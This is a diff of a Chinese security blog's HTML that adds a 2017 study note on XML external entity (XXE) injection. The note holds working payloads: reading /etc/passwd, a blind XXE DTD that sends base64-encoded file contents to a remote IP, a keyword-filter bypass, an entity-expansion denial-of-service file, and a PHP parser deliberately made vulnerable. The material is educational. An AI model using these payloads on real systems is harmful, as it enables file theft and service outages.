@@ -92,12 +92,20 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="Yiruma">
-<meta property="og:url" content="https://someonesometimes.github.io/archives/index.html">
+<meta name="description" content="听说XXE漏洞已经荣登OWASP榜了？看来是时候把之前的XXE学习笔记拿出来翻新一波了。。。">
+<meta name="keywords">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XXE注入攻击">
+<meta property="og:url" content="https://someonesometimes.github.io/2017/11/16/XXE注入攻击/index.html">
 <meta property="og:site_name" content="Yiruma">
+<meta property="og:description" content="听说XXE漏洞已经荣登OWASP榜了？看来是时候把之前的XXE学习笔记拿出来翻新一波了。。。">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/93e435bbgy1flk7u8dbs5j20hp06wq35.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/93e435bbly1flk7yozjvxj20g905yq44.jpg">
+<meta property="og:updated_time" content="2017-11-17T01:41:26.739Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Yiruma">
+<meta name="twitter:title" content="XXE注入攻击">
+<meta name="twitter:description" content="听说XXE漏洞已经荣登OWASP榜了？看来是时候把之前的XXE学习笔记拿出来翻新一波了。。。">
+<meta name="twitter:image" content="https://ws1.sinaimg.cn/large/93e435bbgy1flk7u8dbs5j20hp06wq35.jpg">
 
 
 
@@ -125,13 +133,13 @@
 
 
 
-  <link rel="canonical" href="https://someonesometimes.github.io/archives/"/>
+  <link rel="canonical" href="https://someonesometimes.github.io/2017/11/16/XXE注入攻击/"/>
 
 
 
 
 
-  <title>归档 | Yiruma</title>
+  <title>XXE注入攻击 | Yiruma</title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -157,7 +165,7 @@
     
   
 
-  <div class="container sidebar-position-left  page-archive  ">
+  <div class="container sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -279,403 +287,175 @@
           <div id="content" class="content">
             
 
-  <section id="posts" class="posts-collapse">
-    <span class="archive-move-on"></span>
+  <div id="posts" class="posts-expand">
+    
 
-    <span class="archive-page-counter">
-      
-      
-      
-        
-      
-      嗯..! 目前共计 23 篇日志。 继续努力。
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="https://someonesometimes.github.io/2017/11/16/XXE注入攻击/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Yiruma">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Yiruma">
     </span>
 
     
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">XXE注入攻击</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-16T20:32:55+08:00">
+                2017-11-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
 
       
       
+
+      
+        <p>听说XXE漏洞已经荣登OWASP榜了？看来是时候把之前的XXE学习笔记拿出来翻新一波了。。。</p>
+<a id="more"></a>
+<h2 id="XXE攻击的场景以及用途"><a href="#XXE攻击的场景以及用途" class="headerlink" title="XXE攻击的场景以及用途"></a>XXE攻击的场景以及用途</h2><p>在一切对XML文件进行解析的场景中，都有可能出现XXE注入。像XML文件作为配置文件（spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）,soap通信通信格式，甚至有道题目的参数为<user><name>Yiruma</name></user>处理中也涉及到了对xml文件的解析，此外，网上有一些在线XML格式化工具，还有一ctf题目中的将csv文件转化为xml文件的功能，都可能涉及到不安全的XML文件解析从而存在攻击点<br>说到XXE攻击的常见用途有：实现任意文件读取，重复定义引用（仿递归）攻击，内网探测，更多可用攻击手法都基于实体中可以使用的协议，这个后面会介绍到</p>
+<h2 id="XXE产生的原因"><a href="#XXE产生的原因" class="headerlink" title="XXE产生的原因"></a>XXE产生的原因</h2><p>在有对XML文件进行解析的地方，如果使用了不安全的XML解析函数如php的simplexml_load_string()，对外部实体进行了解析下，就有可能引入不安全的参数，从而造成攻击。</p>
+<h2 id="XML文档结构学习"><a href="#XML文档结构学习" class="headerlink" title="XML文档结构学习"></a>XML文档结构学习</h2><p>XML文档结构包括XML声明，DTD文档类型定义，文档元素</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--XML申明--&gt;</span></div><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span> </div><div class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></div><div class="line"><span class="meta">&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档--&gt;</span></div><div class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;</div><div class="line">&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;</div><div class="line">&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;</div><div class="line">&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;</div><div class="line">&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;</div><div class="line">]&gt;</div><div class="line"><span class="comment">&lt;!--文档元素--&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>当然，重点学习对象就是DTD部分，攻击就是从这里产生的</p>
+<h4 id="DTD学习"><a href="#DTD学习" class="headerlink" title="DTD学习"></a>DTD学习</h4><p>一个DTD中的实体由两种属性组成——参数/非参数实体+内部/外部实体</p>
+<p><img src="https://ws1.sinaimg.cn/large/93e435bbgy1flk7u8dbs5j20hp06wq35.jpg" alt=""></p>
+<p>其中参数实体只能在DTD内部以<code>%实体名</code>的方式引用，而非参数实体则可在XML文档元素，也就是XML的第三个部分以<code>&amp;实体名</code>的方式引用</p>
+<p>内部实体一般定义字符串这些，而外部实体可以使用如下的协议，可以看到这里面有很多危险的协议，我们要做的就是突破限制来使用这些协议来达到我们的目的</p>
+<p><img src="https://ws1.sinaimg.cn/large/93e435bbly1flk7yozjvxj20g905yq44.jpg" alt=""></p>
+<p>来看几个例子</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">这是一个内部实体+参数实体，参数在XML文档文档元素部分引用，不能使用协议</div><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE a [</span></div><div class="line">    &lt;!ENTITY name "nMask"&gt;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;name;<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </div><div class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></div></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">这是一个外部实体+非参数实体，参数在XML文档DTD内部引用，可以使用外部协议</div><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE a [</span></div><div class="line">    &lt;!ENTITY % name SYSTEM "file:///etc/passwd"&gt;</div><div class="line">    %name;</div><div class="line">]&gt;</div></pre></td></tr></table></figure>
+<h2 id="XXE注入的几种姿势"><a href="#XXE注入的几种姿势" class="headerlink" title="XXE注入的几种姿势"></a>XXE注入的几种姿势</h2><h4 id="能够直接回显的"><a href="#能够直接回显的" class="headerlink" title="能够直接回显的"></a>能够直接回显的</h4><p>这种能够回显的，直接写一个参数+外部实体然后调用就好了</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE a [</span></div><div class="line">    &lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </div><div class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></div></pre></td></tr></table></figure>
+<h4 id="不能直接回显的，Blind-XXE"><a href="#不能直接回显的，Blind-XXE" class="headerlink" title="不能直接回显的，Blind XXE"></a>不能直接回显的，Blind XXE</h4><p>首先在vps中建立evil.dtd</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % all</div><div class="line">"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://118.89.16.36/x/?id=%file;'&gt;"</div><div class="line">&gt;</div><div class="line">%all;</div></pre></td></tr></table></figure>
+<p>然后xml中书写如下形式<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE ANY [ </span></div><div class="line">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/hosts"&gt;</div><div class="line">&lt;!ENTITY % dtd SYSTEM "http://118.89.16.36/evil.dtd"&gt;</div><div class="line">%dtd;</div><div class="line">%send;</div><div class="line">]&gt;</div></pre></td></tr></table></figure></p>
+<h4 id="过滤了ENTITY关键字"><a href="#过滤了ENTITY关键字" class="headerlink" title="过滤了ENTITY关键字"></a>过滤了ENTITY关键字</h4><p>DTD文档支持这么一种定义，直接在定义文档类型的时候引入外部DTD文档，之后就是同样的姿势了</p>
+<p>（本地测试没有成功，可能是姿势问题）</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE svg SYSTEM "http://118.89.16.36/evil.dtd"&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;test;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></div><div class="line"></div><div class="line">evil.dtd</div><div class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">test</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></div></pre></td></tr></table></figure>
+<h4 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h4><p>这个文件里面存在11111个实体引用，超出了合法的实体引用数量上限</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE data [</span></div><div class="line">&lt;!ENTITY a0 "dos" &gt;</div><div class="line">&lt;!ENTITY a1 "&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;"&gt;</div><div class="line">&lt;!ENTITY a2 "&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;"&gt;</div><div class="line">&lt;!ENTITY a3 "&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;"&gt;</div><div class="line">&lt;!ENTITY a4 "&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;"&gt;</div><div class="line">]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>&amp;a4;<span class="tag">&lt;/<span class="name">data</span>&gt;</span></div></pre></td></tr></table></figure>
+<h2 id="搭建本地测试环境"><a href="#搭建本地测试环境" class="headerlink" title="搭建本地测试环境"></a>搭建本地测试环境</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$a=<span class="string">&lt;&lt;&lt;XML</span></div><div class="line">//书写XML文档</div><div class="line">XML;</div><div class="line"><span class="comment">//注：在高版本php中对外部实体的解析默认关闭了，所以下面要这样写来启用</span></div><div class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</div><div class="line">$data=simplexml_load_string($a, <span class="string">'SimpleXMLElement'</span>, LIBXML_NOENT);</div><div class="line"><span class="keyword">echo</span> $data;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>参考文章:</p>
+<p><a href="http://www.freebuf.com/articles/web/97833.html" target="_blank" rel="external">DTD/XXE 攻击笔记分享 | FreeBuf</a></p>
+<p><a href="https://thief.one/2017/06/20/1/" target="_blank" rel="external">浅谈XXE漏洞攻击与防御 | nMask’s Blog</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
       
 
       
         
-        <div class="collection-title">
-          <h2 class="archive-year motion-element" id="archive-year-2017">2017</h2>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/11/16/python沙盒绕过/" rel="prev" title="python沙盒的几种绕过方式">
+                python沙盒的几种绕过方式 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
         </div>
       
-      
 
       
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2017/11/16/XXE注入攻击/" itemprop="url">
-              
-                <span itemprop="name">XXE注入攻击</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-11-16T20:32:55+08:00"
-              content="2017-11-16" >
-          11-16
-        </time>
-      </div>
-
-    </header>
+      
+    </footer>
   </article>
 
 
 
-    
-
+    <div class="post-spread">
       
-      
-      
-
-      
-      
-
-      
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2017/11/16/python沙盒绕过/" itemprop="url">
-              
-                <span itemprop="name">python沙盒的几种绕过方式</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-11-16T11:05:18+08:00"
-              content="2017-11-16" >
-          11-16
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-    
-
-      
-      
-      
-
-      
-      
-
-      
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2017/11/14/Out-Of-Band-带外攻击的一点总结/" itemprop="url">
-              
-                <span itemprop="name">Out Of Band 带外攻击的一点总结</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-11-14T22:51:05+08:00"
-              content="2017-11-14" >
-          11-14
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-    
-
-      
-      
-      
-
-      
-      
-
-      
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2017/10/23/Java阻塞队列学习及LinkedBlockingQueue源码分析/" itemprop="url">
-              
-                <span itemprop="name">Java阻塞队列学习及LinkedBlockingQueue源码分析</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-10-23T23:41:07+08:00"
-              content="2017-10-23" >
-          10-23
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-    
-
-      
-      
-      
-
-      
-      
-
-      
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2017/10/21/从模板注入漏洞谈起/" itemprop="url">
-              
-                <span itemprop="name">从模板注入漏洞谈起，到一个烂尾的寻找python沙盒绕过的代码</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-10-21T18:17:03+08:00"
-              content="2017-10-21" >
-          10-21
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-    
-
-      
-      
-      
-
-      
-      
-
-      
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2017/10/01/给信息安全入门者的一些建议/" itemprop="url">
-              
-                <span itemprop="name">给信息安全入门者的一点建议</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-10-01T23:45:00+08:00"
-              content="2017-10-01" >
-          10-01
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-    
-
-      
-      
-      
-
-      
-      
-
-      
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2017/09/19/XSS前端防御———对WHCTF中XSS题目filter-js的分析/" itemprop="url">
-              
-                <span itemprop="name">XSS前端防御———对WHCTF中xss题目filter.js的分析</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-09-19T23:15:14+08:00"
-              content="2017-09-19" >
-          09-19
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-    
-
-      
-      
-      
-
-      
-      
-
-      
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2017/09/04/Padding-Oracle-Attack/" itemprop="url">
-              
-                <span itemprop="name">Padding Oracle Attack</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-09-04T20:29:19+08:00"
-              content="2017-09-04" >
-          09-04
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-    
-
-      
-      
-      
-
-      
-      
-
-      
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2017/08/31/OAuth授权流程学习以及Turning-Self-XSS-into-Good-XSS/" itemprop="url">
-              
-                <span itemprop="name">OAuth授权流程学习以及Turning Self-XSS into Good-XSS</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-08-31T15:17:26+08:00"
-              content="2017-08-31" >
-          08-31
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-    
-
-      
-      
-      
-
-      
-      
-
-      
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/2017/07/23/mysql注入学习（持续更新中）/" itemprop="url">
-              
-                <span itemprop="name">mysql注入学习（持续保持更新）</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2017-07-23T13:53:32+08:00"
-              content="2017-07-23" >
-          07-23
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-    
-
-  </section>
-
-  
-  <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="page-number" href="/archives/page/3/">3</a><a class="extend next" rel="next" href="/archives/page/2/"><i class="fa fa-angle-right"></i></a>
-  </nav>
-
-
+    </div>
+  </div>
 
 
           </div>
@@ -683,6 +463,12 @@
 
 
           
+  <div class="comments" id="comments">
+    
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zMTE1OS83NzA4"></div>
+    
+  </div>
+
 
         </div>
         
@@ -702,8 +488,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/images/avatar.gif"
@@ -754,6 +549,22 @@
 
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE攻击的场景以及用途"><span class="nav-number">1.</span> <span class="nav-text">XXE攻击的场景以及用途</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE产生的原因"><span class="nav-number">2.</span> <span class="nav-text">XXE产生的原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XML文档结构学习"><span class="nav-number">3.</span> <span class="nav-text">XML文档结构学习</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#DTD学习"><span class="nav-number">3.0.1.</span> <span class="nav-text">DTD学习</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XXE注入的几种姿势"><span class="nav-number">4.</span> <span class="nav-text">XXE注入的几种姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#能够直接回显的"><span class="nav-number">4.0.1.</span> <span class="nav-text">能够直接回显的</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#不能直接回显的，Blind-XXE"><span class="nav-number">4.0.2.</span> <span class="nav-text">不能直接回显的，Blind XXE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#过滤了ENTITY关键字"><span class="nav-number">4.0.3.</span> <span class="nav-text">过滤了ENTITY关键字</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#拒绝服务攻击"><span class="nav-number">4.0.4.</span> <span class="nav-text">拒绝服务攻击</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#搭建本地测试环境"><span class="nav-number">5.</span> <span class="nav-text">搭建本地测试环境</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -893,11 +704,9 @@
   
 
   
-  
-    <script type="text/javascript" id="motion.page.archive">
-      $('.archive-year').velocity('transition.slideLeftIn');
-    </script>
-  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
 
 
   
@@ -933,6 +742,17 @@
 
 
 
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
   
 
 
